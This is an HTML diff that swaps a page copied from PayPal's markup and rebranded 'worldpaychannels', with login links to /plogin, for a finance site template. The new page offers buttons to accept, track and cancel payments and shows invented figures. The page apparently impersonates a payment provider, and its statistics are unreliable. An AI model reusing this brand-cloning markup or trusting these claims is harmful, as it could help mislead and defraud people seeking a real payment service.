-                                    <li><button class="generic-tabs__tabs__links " data-index="1">For sellers</button>
-                                    </li>
-                                </ul>
-                            </div>
-                            <div class="generic-tabs__content col-xs-12">
-                                <div>
-                                    <div class="row steps-intent__container">
-                                        <div class="col-md-4 col-sm-12 steps-intent__step">
-                                            <div class="steps-intent__image-wrapper text-xs-center"><span class="steps-intent__arrow"></span>
-                                            </div><span class="steps-intent__circle text-xs-center">1</span>
-                                            <div class="steps-intent__content">
-                                                <p class="steps-intent__text"><a href="/plogin" data-pa-click="for-buyers|signup">Sign up</a> with just an email
-                                                    address and password.</p>
-                                            </div>
-                                        </div>
-                                        <div class="col-md-4 col-sm-12 steps-intent__step">
-                                            <div class="steps-intent__image-wrapper text-xs-center"><span class="steps-intent__arrow"></span>
-                                            </div><span class="steps-intent__circle text-xs-center">2</span>
-                                            <div class="steps-intent__content">
-                                                <p class="steps-intent__text">Securely add your cards.</p>
-                                            </div>
-                                        </div>
-                                        <div class="col-md-4 col-sm-12 steps-intent__step">
-                                            <div class="steps-intent__image-wrapper text-xs-center"><span class="steps-intent__arrow"></span>
-                                            </div><span class="steps-intent__circle text-xs-center">3</span>
-                                            <div class="steps-intent__content">
-                                                <p class="steps-intent__text">Use the worldpaychannels button to check out with
-                                                    just an email address and password.</p>
-                                            </div>
-                                        </div>
-                                    </div>
-                                    <div class="row steps-intent__cta-container"><a href="/plogin/" id="" target="_self" class="pypl-btn mpp-btn pypl-btn--outline-blue steps-intent__btn" data-pa-click="StepsInt-IntNaN-PrmryCTA-Learn More" role="button" pa-marked="1">Learn More</a></div>
-                                </div>
-                            </div>
-                        </div>
-                    </div>
-                </section>
-                <section id="custom-stacked-panel" class="panels theme-background-color-blue custom-stacked-panel" data-building-block="organism">
-                    <div class="container">
-                        <div class="row text-xs-center panels__header">
-                            <div class="col-xs-12">
-                                <h2 class="pypl-heading panels__headline">Join 5M active worldpaychannels accounts worldwide.
-                                </h2>
-                            </div>
-                        </div>
-                        <div class="panels__container">
-                            <div class="row">
-                                <div class="col-lg-4 col-md-4 col-sm-12 col-xs-12 panels__panel">
-                                    <div class="no-image-panel">
-                                        <div class="no-image-panel__top">
-                                            <h3 class="pypl-heading no-image-panel__headline pp-sans-small-regular h4">
-                                                Safer and protected</h3>
-                                            <p class="no-image-panel__paragraph">Shop with peace of mind. We don’t share
-                                                your full financial information with sellers. And worldpaychannels Buyer
-                                                Protection covers your eligible purchases if they don’t show up or match
-                                                their description.</p>
-
-                                        </div>
-                                        <div class="no-image-panel__bottom"></div>
-                                    </div>
-                                </div>
-                                <div class="col-lg-4 col-md-4 col-sm-12 col-xs-12 panels__panel">
-                                    <div class="no-image-panel">
-                                        <div class="no-image-panel__top">
-                                            <h3 class="pypl-heading no-image-panel__headline pp-sans-small-regular h4">
-                                                Across devices, worldwide</h3>
-                                            <p class="no-image-panel__paragraph">With just one account, you can shop at
-                                                millions of merchants around the world, and send money to friends and
-                                                family almost anywhere. Use any of your devices to manage your account
-                                                on the go with the worldpaychannels app.</p>
-
-                                        </div>
-                                        <div class="no-image-panel__bottom"></div>
-                                    </div>
-                                </div>
-                                <div class="col-lg-4 col-md-4 col-sm-12 col-xs-12 panels__panel">
-                                    <div class="no-image-panel">
-                                        <div class="no-image-panel__top">
-                                            <h3 class="pypl-heading no-image-panel__headline pp-sans-small-regular h4">
-                                                Mostly free, always upfront</h3>
-                                            <p class="no-image-panel__paragraph">It’s free to open a worldpaychannels account and
-                                                buy something using worldpaychannels unless it involves a currency conversion.
-                                                There are no worldpaychannels fees if you use your worldpaychannels balance to send money
-                                                in
-                                                your own currency to friends and family. There may be fees for other
-                                                transactions.</p>
-
-                                        </div>
-                                        <div class="no-image-panel__bottom"></div>
-                                    </div>
-                                </div>
-                            </div>
-                        </div>
-                    </div>
-                </section>
-                <section class="pullout closing-cta theme-background-color-light" data-building-block="organism">
-                    <div class="container">
-                        <div class="row">
-                            <div class="col-xs-12 col-lg-10 center-block text-xs-center">
-                                <h2 class="pypl-heading pullout__headline">Sign up and get started.</h2><a href="/plogin" target="_self" alt="Get Started" class="pypl-btn mpp-btn pullout__btn pullout__btn--center pypl-btn--blue" data-pa-click="Pullout-Prmrycta-Get Started" role="button" pa-marked="1">Get
-                                    Started</a>
-                            </div>
-                        </div>
-                    </div>
-                </section>
+          </div>
+        </div><div class="xb-header stricky stricked-menu">
+          <div class="container">
+            <div class="row align-items-center">
+              <div class="col-lg-3 col-5">
+                <div class="site_logo">
+                  <a class="site_link" href="https://html.xpressbuddy.com/synox/index.html">
+                    <img src="./Payment Solutions – Synox – Finance &amp; Consulting Site Template._files/is_logo.svg" alt="Site Logo White">
+                    <img src="./Payment Solutions – Synox – Finance &amp; Consulting Site Template._files/site_logo_black.svg" alt="Site Logo Black">
+                  </a>
+                </div>
+              </div>
+              <div class="col-lg-6 col-2">
+                <nav class="main_menu navbar navbar-expand-lg">
+                  <div class="main_menu_inner collapse navbar-collapse justify-content-lg-center" id="main_menu_dropdown">
+                    <ul class="main_menu_list unordered_list justify-content-center">
+                      <li class="dropdown active">
+                        <a class="nav-link" href="https://html.xpressbuddy.com/synox/index_payment_solutions.html#" id="home_submenu" role="button" data-bs-toggle="dropdown" aria-expanded="false">
+                          Home
+                        </a>
+                        <ul class="dropdown-menu" aria-labelledby="home_submenu">
+                          <li><a href="https://html.xpressbuddy.com/synox/index.html">Investment Solution</a></li>
+                          <li><a href="https://html.xpressbuddy.com/synox/index_online_banking.html">Online Banking</a></li>
+                          <li class="active"><a href="https://html.xpressbuddy.com/synox/index_payment_solutions.html">Payment Solutions</a></li>
+                          <li><a href="https://html.xpressbuddy.com/synox/index_insurance.html">Insurance</a></li>
+                          <li><a href="https://html.xpressbuddy.com/synox/index_car_insurance.html">Car Insurance</a></li>
+                          <li><a href="https://html.xpressbuddy.com/synox/index_financial_consulting.html">Financial Consulting</a></li>
+                        </ul>
+                      </li>
+                      <li class="dropdown">
+                        <a class="nav-link" href="https://html.xpressbuddy.com/synox/index_payment_solutions.html#" id="services_submenu" role="button" data-bs-toggle="dropdown" aria-expanded="false">
+                          Services
+                        </a>
+                        <ul class="dropdown-menu" aria-labelledby="servFices_submenu">
+                          <li><a href="https://html.xpressbuddy.com/synox/services.html">Our Services</a></li>
+                          <li><a href="https://html.xpressbuddy.com/synox/service_details.html">Service Details</a></li>
+                        </ul>
+                      </li>
+                      <li class="dropdown">
+                        <a class="nav-link" href="https://html.xpressbuddy.com/synox/index_payment_solutions.html#" id="projects_submenu" role="button" data-bs-toggle="dropdown" aria-expanded="false">
+                          Projects
+                        </a>
+                        <ul class="dropdown-menu" aria-labelledby="projects_submenu">
+                          <li><a href="https://html.xpressbuddy.com/synox/projects.html">Our Projects</a></li>
+                          <li><a href="https://html.xpressbuddy.com/synox/project_details.html">Project Details</a></li>
+                        </ul>
+                      </li>
+                      <li class="dropdown">
+                        <a class="nav-link" href="https://html.xpressbuddy.com/synox/index_payment_solutions.html#" id="pages_submenu" role="button" data-bs-toggle="dropdown" aria-expanded="false">
+                          Pages
+                        </a>
+                        <ul class="dropdown-menu" aria-labelledby="pages_submenu">
+                          <li><a href="https://html.xpressbuddy.com/synox/contact.html">Help Center</a></li>
+                          <li class="dropdown">
+                            <a class="nav-link" href="https://html.xpressbuddy.com/synox/index_payment_solutions.html#" id="blog_submenu" role="button" data-bs-toggle="dropdown" aria-expanded="false">
+                              Blogs
+                            </a>
+                            <ul class="dropdown-menu" aria-labelledby="blog_submenu">
+                              <li><a href="https://html.xpressbuddy.com/synox/blog.html">Our Blogs</a></li>
+                              <li><a href="https://html.xpressbuddy.com/synox/blog_details.html">Blog Details</a></li>
+                            </ul>
+                          </li>
+                          <li class="dropdown">
+                            <a class="nav-link" href="https://html.xpressbuddy.com/synox/index_payment_solutions.html#" id="career_submenu" role="button" data-bs-toggle="dropdown" aria-expanded="false">
+                              Career
+                            </a>
+                            <ul class="dropdown-menu" aria-labelledby="career_submenu">
+                              <li><a href="https://html.xpressbuddy.com/synox/career.html">Join Us</a></li>
+                              <li><a href="https://html.xpressbuddy.com/synox/career_details.html">Job Details</a></li>
+                            </ul>
+                          </li>
+                          <li><a href="https://html.xpressbuddy.com/synox/error.html">404 Error</a></li>
+                        </ul>
+                      </li>
+                      <li><a href="https://html.xpressbuddy.com/synox/pricing.html">Pricing</a></li>
+                    </ul>
+                  </div>
+                </nav>
+              </div>
+              <div class="col-lg-3 col-5">
+                <ul class="btns_group p-0 unordered_list justify-content-end">
+                  <li>
+                    <button class="mobile_menu_btn" type="button" data-bs-toggle="collapse" data-bs-target="#main_menu_dropdown" aria-expanded="false" aria-label="Toggle navigation">
+                      <i class="far fa-bars"></i>
+                    </button>
+                  </li>
+                  <li>
+                    <a class="btn bg-dark rounded-pill" href="https://html.xpressbuddy.com/synox/index_payment_solutions.html#!">
+                      <span class="btn_icon">
+                        <i class="fa-solid fa-user"></i>
+                      </span>
+                      <span class="btn_label">Login</span>
+                    </a>
+                  </li>
+                </ul>
+              </div>
             </div>
-            <div id="globalnav-footer" data-nav-version="legacy">
-                <footer data-building-block="organism" class="_global-footer_eqdw6_2" id="footer" translate="no">
-                    <div class="_container_eqdw6_1009">
-                        <div class="_row_eqdw6_1044">
-                            <div class="_col-md-12_eqdw6_1053">
-                                <ul class="_footer-main_eqdw6_906">
-                                    <li class="_country-selector_eqdw6_22" data-testid="legacy-country-selector"><a data-testid="footer-flag" href="https://worldpaychannels.com/" aria-label="See all countries/regions" title="See all countries/regions" class="_country_eqdw6_22 _lazy-load-flag_eqdw6_54 _KE_eqdw6_393" data-pa-click="FooterFlag-Link-See all countries/regions">See
-                                            all countries/regions</a></li>
-                                </ul>
-                                <ul class="_footer-main_eqdw6_906">
-                                    <li id="6aHKvOzWZZDvsqSrD7I3XA" class="_global-footer-link_eqdw6_2"><a href="https://worldpaychannels.com/#" target="_self" data-pa-click="Footer-Link-Help" pa-marked="1">Help</a></li>
-                                    <li id="526qaSMxLAcdP5jgV1i9dS" class="_global-footer-link_eqdw6_2"><a href="https://worldpaychannels.com/#" target="_self" data-pa-click="Footer-Link-Contact" pa-marked="1">Contact</a>
-                                    </li>
-                                    <li id="1lHKCQFO3CcCLJfGzZdwUL" class="_global-footer-link_eqdw6_2"><a href="https://worldpaychannels.com/tracking-number/create/" target="_self" data-pa-click="Footer-Link-Fees" pa-marked="1">Fees</a></li>
-                                    <li id="1EhWuLuvsWE1sD1oMWrDV8" class="_global-footer-link_eqdw6_2"><a href="https://worldpaychannels.com/#" target="_self" data-pa-click="Footer-Link-Security" pa-marked="1">Security</a></li>
-                                    <li id="5bKHA1hsJ292wNdudP1c60" class="_global-footer-link_eqdw6_2"><a href="https://worldpaychannels.com/#" target="_self" data-pa-click="Footer-Link-Features" pa-marked="1">Features</a></li>
-                                    <li id="3ll8OVDrdZZXPSSiidWBJP" class="_global-footer-link_eqdw6_2"><a href="https://worldpaychannels.com/#" target="_self" data-pa-click="Footer-Link-Shop" pa-marked="1">Shop</a></li>
-                                </ul>
-                            </div>
-                        </div>
-                        <div class="_row_eqdw6_1044">
-                            <div class="_col-md-12_eqdw6_1053">
-                                <hr class="_hidden-lg-down_eqdw6_902 _primary_eqdw6_896">
-                            </div>
-                        </div>
-                        <div class="_row_eqdw6_1044">
-                            <div class="_col-md-12_eqdw6_1053">
-                                <ul class="_footer-secondary_eqdw6_907 _footer-corplinks_eqdw6_1086">
-                                    <li id="3FjYio2A8GtmXbxTm8B8uW" class="_global-footer-link_eqdw6_2"><a href="https://worldpaychannels.com/#" target="_self" data-pa-click="Footer-Link-About" pa-marked="1">About</a>
-                                    </li>
-                                    <li id="1TNoDdLaveTf711qxdVm0I" class="_global-footer-link_eqdw6_2"><a href="https://worldpaychannels.com/#" target="_self" data-pa-click="Footer-Link-Newsroom" pa-marked="1">Newsroom</a></li>
-                                    <li id="3Sd5cpPIERCTjkAJnzI7hD" class="_global-footer-link_eqdw6_2"><a href="https://worldpaychannels.com/#" target="_self" data-pa-click="Footer-Link-Jobs" pa-marked="1">Jobs</a></li>
-                                    <li id="ngAFd0FJPF4m6QOlWiOD4" class="_global-footer-link_eqdw6_2"><a href="https://worldpaychannels.com/#" target="_self" data-pa-click="Footer-Link-Developers" pa-marked="1">Developers</a></li>
-                                    <li id="6aIT7M2XTMz3tUZz2DBiP9" class="_global-footer-link_eqdw6_2"><a href="https://worldpaychannels.com/#" target="_self" data-pa-click="Footer-Link-Partners" pa-marked="1">Partners</a></li>
-                                </ul>
-                                <hr class="_hidden-lg-down_eqdw6_902 _secondary_eqdw6_892">
-                                <ul class="_footer-tertiary_eqdw6_908 _copyright-section_eqdw6_1083">
-                                    <li class="_footer-copyright_eqdw6_925">© 1999–2023</li>
-                                    <li id="4gayW8yfp3giRhZNayREux" class="_global-footer-link_eqdw6_2"><a href="https://worldpaychannels.com/#" target="_self" data-pa-click="Footer-Link-Accessibility" pa-marked="1">Accessibility</a>
-                                    </li>
-                                    <li id="2QZiZh5iTaJrq6LYL7xdnF" class="_global-footer-link_eqdw6_2"><a href="https://worldpaychannels.com/#" target="_self" data-pa-click="Footer-Link-Cookies" pa-marked="1">Cookies</a>
-                                    </li>
-                                    <li id="5dXw7i3lxgktbWMDXjFdT9" class="_global-footer-link_eqdw6_2"><a href="https://worldpaychannels.com/#" target="_self" data-pa-click="Footer-Link-Privacy" pa-marked="1">Privacy</a>
-                                    </li>
-                                    <li id="3b2y9fqKPOLuv2ZGQuA5Dv" class="_global-footer-link_eqdw6_2"><a href="https://worldpaychannels.com/#" target="_self" data-pa-click="Footer-Link-Legal" pa-marked="1">Legal</a>
-                                    </li>
-                                </ul>
-                            </div>
-                        </div>
-
-                    </div>
-                </footer>
-            </div>
+          </div>
         </div>
+      </header>
+      <!-- Site Header - End
+      ================================================== -->
+
+      <!-- Main Body - Start
+      ================================================== -->
+      <main class="page_content">
+
+        <!-- Hero Section - Start
+        ================================================== -->
+        <section class="hero_section hero_payment_solutions overflow-hidden section_decoration bg-dark">
+          <div class="container text-center">
+            <div class="row justify-content-center">
+              <div class="col-lg-11">
+                <div class="badge text-uppercase text-primary bg-primary-subtle wow fadeInUp" data-wow-delay=".1s" style="visibility: visible; animation-delay: 0.1s; animation-name: fadeInUp;">easily send money anywhere</div>
+                <h1 class="hero_title text-white wow fadeInUp" data-wow-delay=".3s" style="visibility: visible; animation-delay: 0.3s; animation-name: fadeInUp;">
+                  Fast, Reliable Payment Solutions for Today's Needs
+                </h1>
+              </div>
+            </div>
+          </div>
+          <div class="container-fluid">
+            <div class="row">
+              <div class="col-lg-3">
+                <p class="text-white wow fadeInLeft" data-wow-delay=".4s" style="visibility: visible; animation-delay: 0.4s; animation-name: fadeInLeft;">
+                  In today's fast-paced world, businesses and individuals demand  efficient and dependable payment solutions. That's where we come in.
+                </p>
+                <ul class="btns_group unordered_list_block p-0">
+                  <li class="wow fadeInLeft" data-wow-delay=".5s" style="visibility: hidden; animation-delay: 0.5s; animation-name: none;">
+                    <a class="btn bg-primary text-dark btn-rounded" href="/choice">
+                      <span class="btn_label">Accept Payments</span>
+                      <span class="btn_icon"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M19.7071 8.70711C20.0976 8.31658 20.0976 7.68342 19.7071 7.29289L13.3431 0.928932C12.9526 0.538408 12.3195 0.538408 11.9289 0.928932C11.5384 1.31946 11.5384 1.95262 11.9289 2.34315L17.5858 8L11.9289 13.6569C11.5384 14.0474 11.5384 14.6805 11.9289 15.0711C12.3195 15.4616 12.9526 15.4616 13.3431 15.0711L19.7071 8.70711ZM0 9H19V7H0V9Z" fill="black"></path>
+                      </svg></span>
+                    </a><br><br>
+                    <a class="btn bg-primary text-dark btn-rounded" href="/track">
+                      <span class="btn_label">Track Payments</span>
+                      <span class="btn_icon"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M19.7071 8.70711C20.0976 8.31658 20.0976 7.68342 19.7071 7.29289L13.3431 0.928932C12.9526 0.538408 12.3195 0.538408 11.9289 0.928932C11.5384 1.31946 11.5384 1.95262 11.9289 2.34315L17.5858 8L11.9289 13.6569C11.5384 14.0474 11.5384 14.6805 11.9289 15.0711C12.3195 15.4616 12.9526 15.4616 13.3431 15.0711L19.7071 8.70711ZM0 9H19V7H0V9Z" fill="black"></path>
+                      </svg></span>
+                    </a><br><br>
+                    <a class="btn bg-primary text-dark btn-rounded" href="/choice">
+                      <span class="btn_label">Cancel payments</span>
+                      <span class="btn_icon"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M19.7071 8.70711C20.0976 8.31658 20.0976 7.68342 19.7071 7.29289L13.3431 0.928932C12.9526 0.538408 12.3195 0.538408 11.9289 0.928932C11.5384 1.31946 11.5384 1.95262 11.9289 2.34315L17.5858 8L11.9289 13.6569C11.5384 14.0474 11.5384 14.6805 11.9289 15.0711C12.3195 15.4616 12.9526 15.4616 13.3431 15.0711L19.7071 8.70711ZM0 9H19V7H0V9Z" fill="black"></path>
+                      </svg></span>
+                    </a><br><br>
+                  </li>
+                  <li class="wow fadeInLeft" data-wow-delay=".6s" style="visibility: hidden; animation-delay: 0.6s; animation-name: none;">
+                    <div class="avatars_block">
+                      <div class="text_content text-white mb-3">
+                        Over <b>9,000+</b> Reviews
+                      </div>
+                      <ul class="avatars_group unordered_list">
+                        <li>
+                          <img src="./Payment Solutions – Synox – Finance &amp; Consulting Site Template._files/avatar_image_4.webp" alt="Avatar Image">
+                        </li>
+                        <li>
+                          <img src="./Payment Solutions – Synox – Finance &amp; Consulting Site Template._files/avatar_image_5.webp" alt="Avatar Image">
+                        </li>
+                        <li>
+                          <img src="./Payment Solutions – Synox – Finance &amp; Consulting Site Template._files/avatar_image_6.webp" alt="Avatar Image">
+                        </li>
+                        <li>
+                          <span>9K+</span>
+                        </li>
+                      </ul>
+                    </div>
+                  </li>
+                </ul>
+              </div>
+              <div class="col-lg-3 order-lg-last">
+                <ul class="btns_group unordered_list_block p-0">
+                  <li class="wow fadeInRight" data-wow-delay=".4s" style="visibility: visible; animation-delay: 0.4s; animation-name: fadeInRight;">
+                    <div class="funfact_block left_layout flex-column">
+                      <div class="funfact_icon bg-dark">
+                        <img src="./Payment Solutions – Synox – Finance &amp; Consulting Site Template._files/icon_medal.svg" alt="Icon Medal">
+                      </div>
+                      <div class="funfact_content">
+                        <h4 class="funfact_title mb-0 text-uppercase">Our daily achievement</h4>
+                      </div>
+                    </div>
+                  </li>
+                  <li class="wow fadeInRight" data-wow-delay=".5s" style="visibility: hidden; animation-delay: 0.5s; animation-name: none;">
+                    <div class="funfact_block">
+                      <div class="funfact_value">
+                        <span class="odometer odometer-auto-theme" data-count="89"><div class="odometer-inside"><span class="odometer-digit"><span class="odometer-digit-spacer">8</span><span class="odometer-digit-inner"><span class="odometer-ribbon"><span class="odometer-ribbon-inner"><span class="odometer-value">8</span></span></span></span></span><span class="odometer-digit"><span class="odometer-digit-spacer">8</span><span class="odometer-digit-inner"><span class="odometer-ribbon"><span class="odometer-ribbon-inner"><span class="odometer-value">9</span></span></span></span></span></div></span>
+                        <span>M+</span>
+                      </div>
+                      <h4 class="funfact_title mb-0">Daily Transactions</h4>
+                    </div>
+                  </li>
+                  <li class="wow fadeInRight" data-wow-delay=".6s" style="visibility: hidden; animation-delay: 0.6s; animation-name: none;">
+                    <div class="funfact_block">
+                      <div class="funfact_value">
+                        <span>+</span>
+                        <span class="odometer odometer-auto-theme" data-count="9"><div class="odometer-inside"><span class="odometer-digit"><span class="odometer-digit-spacer">8</span><span class="odometer-digit-inner"><span class="odometer-ribbon"><span class="odometer-ribbon-inner"><span class="odometer-value">9</span></span></span></span></span></div></span>
+                        <span>%</span>
+                      </div>
+                      <h4 class="funfact_title mb-0">Unlimited Daily Cashback</h4>
+                    </div>
+                  </li>
+                </ul>
+              </div>
+              <div class="col-lg-6">
+                <div class="hero_hand_image wow fadeInUp" data-wow-delay=".3s" style="visibility: visible; animation-delay: 0.3s; animation-name: fadeInUp;">
+                  <img src="./Payment Solutions – Synox – Finance &amp; Consulting Site Template._files/hero_hand_image_2.webp" alt="Hand Image">
+                </div>
+              </div>
+            </div>
+          </div>
+          
+          <div class="decoration_item shape_pattern_1">
+            <img src="./Payment Solutions – Synox – Finance &amp; Consulting Site Template._files/shape_pattern_1.svg" alt="Shape Pattern">
+          </div>
+          <div class="decoration_item shape_pattern_2">
+            <img src="./Payment Solutions – Synox – Finance &amp; Consulting Site Template._files/shape_pattern_2.svg" alt="Shape Pattern">
+          </div>
+          <div class="decoration_item shape_nate_1">
+            <img src="./Payment Solutions – Synox – Finance &amp; Consulting Site Template._files/shape_nate_14.svg" alt="Shape Nate">
+          </div>
+          <div class="decoration_item shape_nate_2">
+            <img src="./Payment Solutions – Synox – Finance &amp; Consulting Site Template._files/shape_nate_15.svg" alt="Shape Nate">
+          </div>
+        </section>
+        <!-- Hero Section - End
+        ================================================== -->
+
+  
+
+        <!-- Payment Methods Section - Start
+        ================================================== -->
+        <section class="payment_methods_section">
+          <div class="content_wrapper section_decoration overflow-hidden">
+            <div class="container">
+              <div class="heading_block style_2 text-center">
+                <div class="badge text-uppercase text-primary bg-primary-subtle">CORE FEATURES</div>
+                <h2 class="heading_text mb-0">
+                  Variety of Payment Methods
+                </h2>
+              </div>
+
+              <div class="row">
+                <div class="col-lg-3 col-md-6 col-sm-6">
+                  <div class="payment_method_block">
+                    <div class="block_icon border-bottom-0">
+                      <img src="./Payment Solutions – Synox – Finance &amp; Consulting Site Template._files/icon_payment_card.svg" alt="Payment Card">
+                    </div>
+                    <div class="block_content border-top-0">
+                      <h3 class="block_title">Card</h3>
+                      <p>
+                         Providing Convenient &amp; Secure Payment Options for Need.
+                      </p>
+                      <a class="btn-link" href="https://html.xpressbuddy.com/synox/service_details.html">
+                        <span class="btn_label">Read More</span>
+                        <span class="btn_icon"><i class="fa-regular fa-arrow-up-right"></i></span>
+                      </a>
+                    </div>
+                  </div>
+                </div>
+                <div class="col-lg-3 col-md-6 col-sm-6">
+                  <div class="payment_method_block">
+                    <div class="block_icon border-bottom-0">
+                      <img src="./Payment Solutions – Synox – Finance &amp; Consulting Site Template._files/icon_face.svg" alt="Payment Card">
+                    </div>
+                    <div class="block_content border-top-0">
+                      <h3 class="block_title">FacePay24</h3>
+                      <p>
+                        Simplifying Transactions with Facial Recognition.
+                      </p>
+                      <a class="btn-link" href="https://html.xpressbuddy.com/synox/service_details.html">
+                        <span class="btn_label">Read More</span>
+                        <span class="btn_icon"><i class="fa-regular fa-arrow-up-right"></i></span>
+                      </a>
+                    </div>
+                  </div>
+                </div>
+                <div class="col-lg-3 col-md-6 col-sm-6">
+                  <div class="payment_method_block">
+                    <div class="block_icon border-bottom-0">
+                      <img src="./Payment Solutions – Synox – Finance &amp; Consulting Site Template._files/icon_visa.svg" alt="Payment Card">
+                    </div>
+                    <div class="block_content border-top-0">
+                      <h3 class="block_title">Visa Click to Pay</h3>
+                      <p>
+                        Streamlining Your Purchases with Seamless Transactions.
+                      </p>
+                      <a class="btn-link" href="https://html.xpressbuddy.com/synox/service_details.html">
+                        <span class="btn_label">Read More</span>
+                        <span class="btn_icon"><i class="fa-regular fa-arrow-up-right"></i></span>
+                      </a>
+                    </div>
+                  </div>
+                </div>
+                <div class="col-lg-3 col-md-6 col-sm-6">
+                  <div class="payment_method_block">
+                    <div class="block_icon border-bottom-0">
+                      <img src="./Payment Solutions – Synox – Finance &amp; Consulting Site Template._files/icon_pay_24.svg" alt="Payment Card">
+                    </div>
+                    <div class="block_content border-top-0">
+                      <h3 class="block_title">PrivatPay</h3>
+                      <p>
+                        Your Trusted Partner in Secure and Seamless Transactions.
+                      </p>
+                      <a class="btn-link" href="https://html.xpressbuddy.com/synox/service_details.html">
+                        <span class="btn_label">Read More</span>
+                        <span class="btn_icon"><i class="fa-regular fa-arrow-up-right"></i></span>
+                      </a>
+                    </div>
+                  </div>
+                </div>
+                <div class="col-lg-3 col-md-6 col-sm-6">
+                  <div class="payment_method_block">
+                    <div class="block_icon border-bottom-0">
+                      <img src="./Payment Solutions – Synox – Finance &amp; Consulting Site Template._files/icon_google_pay.svg" alt="Payment Card">
+                    </div>
+                    <div class="block_content border-top-0">
+                      <h3 class="block_title">Google Pay</h3>
+                      <p>
+                        Enhancing and Efficiency in Your Financial Transactions.
+                      </p>
+                      <a class="btn-link" href="https://html.xpressbuddy.com/synox/service_details.html">
+                        <span class="btn_label">Read More</span>
+                        <span class="btn_icon"><i class="fa-regular fa-arrow-up-right"></i></span>
+                      </a>
+                    </div>
+                  </div>
+                </div>
+                <div class="col-lg-3 col-md-6 col-sm-6">
+                  <div class="payment_method_block">
+                    <div class="block_icon border-bottom-0">
+                      <img src="./Payment Solutions – Synox – Finance &amp; Consulting Site Template._files/icon_apple_pay.svg" alt="Payment Card">
+                    </div>
+                    <div class="block_content border-top-0">
+                      <h3 class="block_title">Apple Pay</h3>
+                      <p>
+                        Seamlessly Streamlining Your Financial Transactions.
+                      </p>
+                      <a class="btn-link" href="https://html.xpressbuddy.com/synox/service_details.html">
+                        <span class="btn_label">Read More</span>
+                        <span class="btn_icon"><i class="fa-regular fa-arrow-up-right"></i></span>
+                      </a>
+                    </div>
+                  </div>
+                </div>
+                <div class="col-lg-3 col-md-6 col-sm-6">
+                  <div class="payment_method_block">
+                    <div class="block_icon border-bottom-0">
+                      <img src="./Payment Solutions – Synox – Finance &amp; Consulting Site Template._files/icon_qr_code.svg" alt="Payment Card">
+                    </div>
+                    <div class="block_content border-top-0">
+                      <h3 class="block_title">QR</h3>
+                      <p>
+                        Instant Transactions with a Simple Scan Made Possible.
+                      </p>
+                      <a class="btn-link" href="https://html.xpressbuddy.com/synox/service_details.html">
+                        <span class="btn_label">Read More</span>
+                        <span class="btn_icon"><i class="fa-regular fa-arrow-up-right"></i></span>
+                      </a>
+                    </div>
+                  </div>
+                </div>
+                <div class="col-lg-3 col-md-6 col-sm-6">
+                  <div class="payment_method_block">
+                    <div class="block_icon border-bottom-0">
+                      <img src="./Payment Solutions – Synox – Finance &amp; Consulting Site Template._files/icon_chart_3.svg" alt="Payment Card">
+                    </div>
+                    <div class="block_content border-top-0">
+                      <h3 class="block_title">Payment by Parts</h3>
+                      <p>
+                        Breakdown Your Purchases into Manageable Parts.
+                      </p>
+                      <a class="btn-link" href="https://html.xpressbuddy.com/synox/service_details.html">
+                        <span class="btn_label">Read More</span>
+                        <span class="btn_icon"><i class="fa-regular fa-arrow-up-right"></i></span>
+                      </a>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+
+            <div class="decoration_item shape_nate_1">
+              <img src="./Payment Solutions – Synox – Finance &amp; Consulting Site Template._files/shape_nate_15.svg" alt="Shape Nate">
+            </div>
+            <div class="decoration_item shape_nate_2">
+              <img src="./Payment Solutions – Synox – Finance &amp; Consulting Site Template._files/shape_nate_15.svg" alt="Shape Nate">
+            </div>
+            <div class="decoration_item shape_nate_3">
+              <img src="./Payment Solutions – Synox – Finance &amp; Consulting Site Template._files/shape_nate_16.svg" alt="Shape Nate">
+            </div>
+          </div>
+        </section>
+        <!-- Payment Methods Section - End
+        ================================================== -->
+
+
+
+        <div class="bg-dark">
+
+          <!-- Powering Industry Section - Start
+          ================================================== -->
+          <section class="powering_industry_section section_space section_decoration">
+            <div class="container">
+              <div class="row align-items-center justify-content-lg-between">
+                <div class="col-lg-6">
+                  <div class="heading_block style_2">
+                    <div class="badge text-uppercase text-primary bg-primary-subtle">Payment Solution</div>
+                    <h2 class="heading_text mb-0">
+                      Powering Every Industry.
+                    </h2>
+                  </div>
+                  <div class="accordion" id="industry_accordion">
+                    <div class="accordion-item">
+                      <div class="accordion-header">
+                        <button class="accordion-button" type="button" data-bs-toggle="collapse" data-bs-target="#collapse_one" aria-expanded="true" aria-controls="collapse_one">
+                          <span class="icon">
+                            <img src="./Payment Solutions – Synox – Finance &amp; Consulting Site Template._files/icon_box.svg" alt="Icon Box">
+                          </span>
+                          E-commerce
+                        </button>
+                      </div>
+                      <div id="collapse_one" class="accordion-collapse collapse show" data-bs-parent="#industry_accordion">
+                        <div class="accordion-body">
+                          <p class="m-0 text-muted">
+                            Education is the cornerstone of personal and societal growth, serving as  a catalyst for enlightenment, innovation, progress. Through  education, individuals gain knowledge.
+                          </p>
+                        </div>
+                      </div>
+                    </div>
+                    <div class="accordion-item">
+                      <div class="accordion-header">
+                        <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapse_two" aria-expanded="false" aria-controls="collapse_two">
+                          <span class="icon">
+                            <img src="./Payment Solutions – Synox – Finance &amp; Consulting Site Template._files/icon_graduation_cap.svg" alt="Icon Graduation Cap">
+                          </span>
+                          Education
+                        </button>
+                      </div>
+                      <div id="collapse_two" class="accordion-collapse collapse" data-bs-parent="#industry_accordion">
+                        <div class="accordion-body">
+                          <p class="m-0 text-muted">
+                            Education is the cornerstone of personal and societal growth, serving as  a catalyst for enlightenment, innovation, progress. Through  education, individuals gain knowledge.
+                          </p>
+                        </div>
+                      </div>
+                    </div>
+                    <div class="accordion-item">
+                      <div class="accordion-header">
+                        <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapse_three" aria-expanded="false" aria-controls="collapse_three">
+                          <span class="icon">
+                            <img src="./Payment Solutions – Synox – Finance &amp; Consulting Site Template._files/icon_gadget.svg" alt="Icon Gadget">
+                          </span>
+                          SaaS
+                        </button>
+                      </div>
+                      <div id="collapse_three" class="accordion-collapse collapse" data-bs-parent="#industry_accordion">
+                        <div class="accordion-body">
+                          <p class="m-0 text-muted">
